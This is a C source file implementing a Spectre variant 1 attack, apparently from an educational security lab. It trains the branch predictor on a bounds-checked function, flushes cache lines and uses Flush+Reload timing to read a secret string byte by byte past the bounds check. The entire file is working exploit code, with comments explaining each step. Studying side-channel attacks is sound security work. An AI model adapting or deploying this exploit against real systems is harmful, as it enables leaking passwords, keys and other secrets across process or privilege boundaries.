#include <emmintrin.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <x86intrin.h>

unsigned int buffer_size = 10;
uint8_t buffer[10] = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9};
uint8_t temp = 0;
char *secret = "Some Secret Value";
uint8_t array[256 * 4096];

#define CACHE_HIT_THRESHOLD (180)
#define DELTA 1024

// Sandbox Function

uint8_t restrictedAccess(size_t x)
{
  if (x < buffer_size) {		//buffer_size is kept as the limit of unrestricted access
     return buffer[x];
  } else {
     return 0;
  } 
}

void flushSideChannel()
{
  int i;
   // Write to array to bring it to RAM to prevent Copy-on-write
  for (i = 0; i < 256; i++)
	 array[i*4096 + DELTA] = 1;
  
  //flush the values of the array from cache
  for (i = 0; i < 256; i++) 
	_mm_clflush(&array[i*4096 +DELTA]);
}

static int scores[256];			/*This array is used to keep track of number of times a secret is returned*/

void reloadSideChannelImproved()
{
 int access=0;
  register uint64_t timebefore, timeafter;
  volatile uint8_t *addr;
  int i;
  
  for(i = 0; i < 256; i++){
  
   addr = &array[i*4096 + DELTA];
   
   timebefore = __rdtscp(&access);		 //Time Stamp Counter of CPU before memory read
   access = *addr;				 //Array element is accessed
   timeafter = __rdtscp(&access) - timebefore;  //Difference gives the time taken to access the array element

    if (timeafter <= CACHE_HIT_THRESHOLD)
      scores[i]++; 			// if cache hit, increase the value stored at i by 1 (instead of printing i ) 
  } 
}

void spectreAttack(size_t larger_x)
{
  int i;
  uint8_t s;
  //volatile int z;
 
  // Train the CPU to take the true branch inside restrictedAccess().
 
   for (i = 0; i < 10; i++) { 
  	 _mm_clflush(&buffer_size);
  	 restrictedAccess(i); 
  }
  
  
  _mm_clflush(&buffer_size);			//Flush the buffer size from the cache
  for (i = 0; i < 256; i++)  { 
	_mm_clflush(&array[i*4096 + DELTA]);	//Flush the array from the cache
 }
   
  s = restrictedAccess(larger_x);  /* Ask restrictedAccess() to store the starting character of the secret in cache by out-of-order 		                              execution. */
  array[s*4096 + DELTA] += 88;     //letting the element stay in the cache
}

int main(int argc, const char **argv) {
  int i;
  uint8_t s;
  size_t larger_x = (size_t)(secret - (char *)buffer);
  flushSideChannel();

  size_t len = 0;
  if (argc == 2) { // An argument of the length of secret should be passed
    len = atoi(argv[1]);	//converts length value in string to integer
    printf("Reading %d bytes\n", len);
  }
  while (len != 0) {
    for (i = 0; i < 256; i++) // initializing scores array
	scores[i] = 0;
    for (i = 0; i < 1000; i++) {
      spectreAttack(larger_x); 	//passing the offset value of the secret to cache
      reloadSideChannelImproved();
    }
    int max = 1;
    for (i = 1; i < 256; i++) {
      if (scores[max] < scores[i])
	 max = i;
    }
    printf("%c", max);
    ++larger_x;
    --len;
  }
  printf("\n");
  return (0);
}

